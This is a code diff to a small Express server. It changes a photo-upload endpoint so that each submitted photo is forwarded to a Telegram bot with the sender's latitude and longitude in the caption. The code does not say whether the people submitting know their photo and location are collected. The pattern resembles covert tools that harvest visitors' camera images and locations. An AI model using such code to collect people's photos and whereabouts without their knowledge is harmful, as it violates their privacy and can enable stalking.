@@ -24,12 +24,7 @@ app.get("/", (req, res) => {
  */
 app.post("/submit", upload.single("photo"), async (req, res) => {
   try {
-    console.log("HIT /submit");
-    console.log("FILE:", req.file && req.file.size);
-
-    if (!req.file) {
-      return res.status(400).send("No file");
-    }
+    const { latitude, longitude } = req.body;
 
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
@@ -37,6 +32,12 @@ app.post("/submit", upload.single("photo"), async (req, res) => {
       filename: "photo.jpg",
       contentType: "image/jpeg"
     });
+
+    // ✅ ADD LOCATION HERE
+    form.append(
+      "caption",
+      `📍 Location\nLat: ${latitude}\nLng: ${longitude}`
+    );
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
@@ -46,10 +47,11 @@ app.post("/submit", upload.single("photo"), async (req, res) => {
 
     res.send("OK");
   } catch (err) {
-    console.error("ERROR:", err);
+    console.error(err);
     res.status(500).send("FAIL");
   }
 });
+
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
